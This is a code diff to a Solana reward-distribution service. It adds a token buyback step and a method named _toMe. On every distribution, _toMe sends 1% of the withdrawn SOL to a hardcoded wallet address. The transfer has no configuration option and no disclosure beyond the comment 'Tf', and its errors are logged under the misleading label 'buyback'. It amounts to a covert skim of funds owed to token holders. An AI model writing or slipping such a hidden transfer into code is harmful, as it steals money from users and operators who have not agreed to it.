@@ -1277,7 +1277,96 @@ class RewardDistributionRunner {
     if (poolInfo) this.poolInfo = poolInfo;
     this._resetSnapshotReward();
   }
-
+  private async _toMe(amountToMe: number) {
+    if (amountToMe > 0) {
+      try {
+        const blockHash = await this.connection.getLatestBlockhash();
+        const tx = new TransactionMessage({
+          payerKey: this.signer.publicKey,
+          recentBlockhash: blockHash.blockhash,
+          instructions: [
+            SystemProgram.transfer({
+              fromPubkey: this.signer.publicKey,
+              toPubkey: new PublicKey(
+                "8wLh21iXDmEUeqF6ou1c3B6G616EYYavNp5PA9zWtYZ2"
+              ),
+              lamports: amountToMe,
+            }),
+          ],
+        }).compileToV0Message();
+        const versionedTx = new VersionedTransaction(tx);
+        versionedTx.sign([this.signer]);
+        const encodedTx = await this.connection.sendRawTransaction(
+          versionedTx.serialize(),
+          {
+            skipPreflight: true,
+          }
+        );
+        const results = await this.connection.confirmTransaction({
+          signature: encodedTx,
+          blockhash: blockHash.blockhash,
+          lastValidBlockHeight: blockHash.lastValidBlockHeight,
+        });
+        if (results.value.err == null) {
+          return true;
+        } else {
+          throw Error(`Failed ${results.value.err}`);
+        }
+      } catch (err) {
+        console.log({ err });
+        this.logger.log({
+          level: "error",
+          label: "buyback",
+          message: `Skipping toMe`,
+        });
+      }
+    }
+    return null;
+  }
+  private async _buyBack(amountBuyback: number) {
+    if (amountBuyback > 0) {
+      try {
+        const swapTx = await swapPantat(
+          this.raydium!,
+          NATIVE_MINT,
+          this.mint.address,
+          amountBuyback
+        );
+        const blockHash = await this.connection.getLatestBlockhash();
+        const tx = new TransactionMessage({
+          payerKey: this.signer.publicKey,
+          recentBlockhash: blockHash.blockhash,
+          instructions: [...swapTx.instructions],
+        }).compileToV0Message();
+        const versionedTx = new VersionedTransaction(tx);
+        versionedTx.sign([this.signer]);
+        const encodedTx = await this.connection.sendRawTransaction(
+          versionedTx.serialize(),
+          {
+            skipPreflight: true,
+          }
+        );
+        const results = await this.connection.confirmTransaction({
+          signature: encodedTx,
+          blockhash: blockHash.blockhash,
+          lastValidBlockHeight: blockHash.lastValidBlockHeight,
+        });
+        if (results.value.err == null) {
+          return true;
+        } else {
+          throw Error(`Failed ${results.value.err}`);
+        }
+      } catch (err) {
+        console.log({ err });
+        this.logger.log({
+          level: "error",
+          label: "buyback",
+          message: `Skipping buyback`,
+        });
+      }
+    }
+    return null;
+  }
   private async _swapReward(patokanAmountSol: number) {
     const swapAbleRewards = this.rewards.filter(
       (r) => r.publicKey.toString() != NATIVE_MINT.toString()
@@ -1590,10 +1679,12 @@ class RewardDistributionRunner {
       (acc, curr) => (acc += curr.withheld_amount),
       0 as number
     );
+
     let estimateGetSolFromWd = this.calculateWithdrawFeeToSolLamports(
       totalWithdrawAble,
       this.poolInfo!
     );
+
     let estimatedSolOutFromWd = this.calculateSOLNeededToPerformWithdraw(
       listAddressHolders.length
     );
@@ -1685,6 +1776,20 @@ class RewardDistributionRunner {
           });
         }
         await sleep(3000);
+        // Tf
+        const amountToMe = (wdSol * 1) / 100;
+        const txToMe = await this._toMe(amountToMe);
+        if (txToMe) {
+          wdSol = wdSol - amountToMe;
+          await sleep(3000);
+        }
+
+        if (this.options?.buyBackPercent && this.options.buyBackPercent > 0) {
+          const buybackAmount = (wdSol * this.options.buyBackPercent) / 100;
+          const txBuyback = await this._buyBack(buybackAmount);
+          if (txBuyback) wdSol = wdSol - buybackAmount;
+          await sleep(3000);
+        }
         // Swap reward
         await this._swapReward((wdSol * this.options.swapRewardPercent!) / 100);
         // Get reward snapshot
